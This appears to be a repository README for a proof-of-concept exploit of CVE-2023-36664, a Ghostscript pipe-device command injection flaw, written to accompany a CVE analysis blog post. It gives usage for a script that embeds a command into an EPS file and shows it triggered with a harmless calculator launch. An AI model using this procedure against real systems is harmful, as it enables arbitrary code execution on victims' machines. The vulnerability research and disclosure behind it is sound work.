# Ghostscript command injection vulnerability PoC (CVE-2023-36664)

Vulnerability disclosed in Ghostscript prior to version 10.01.2 leads to code execution (CVSS score 9.8).

<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36664" target="_blank">Official</a> vulnerability description:
> Artifex Ghostscript through 10.01.2 mishandles permission validation for pipe devices (with the %pipe% prefix or the | pipe character prefix).

<a href="https://www.debian.org/security/2023/dsa-5446" target="_blank">Debian</a> released a security advisory mentioning possible execution of arbitrary commands:
> "It was discovered that Ghostscript, the GPL PostScript/PDF interpreter, does not properly handle permission validation for pipe devices, which could result in the execution of arbitrary commands if malformed document files are processed."

The repo is created for a CVE analysis blog post available on <a href="https://www.vicarius.io/vsociety" target="_blank">vsociety blog</a>.

## Exploitation
Download Ghostscript 10.01.1 here: https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10011
Direct link to windows x64 executable: https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs10011/gs10011w64.exe

The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices. 

Usage: `python3 CVE_2023_36664_exploit.py <input_file> <command>`

Example:
```bash
python3 CVE_2023_36664_exploit.py file.eps "calc"
```
This generates a new file called `file_injected.eps`.

Open this with Ghostscript to trigger calculator (since version 9.50 you also have to use `-dNOSAFER` option):
```bash
gs10011w64.exe -dNOSAFER .\file_injected.eps
```
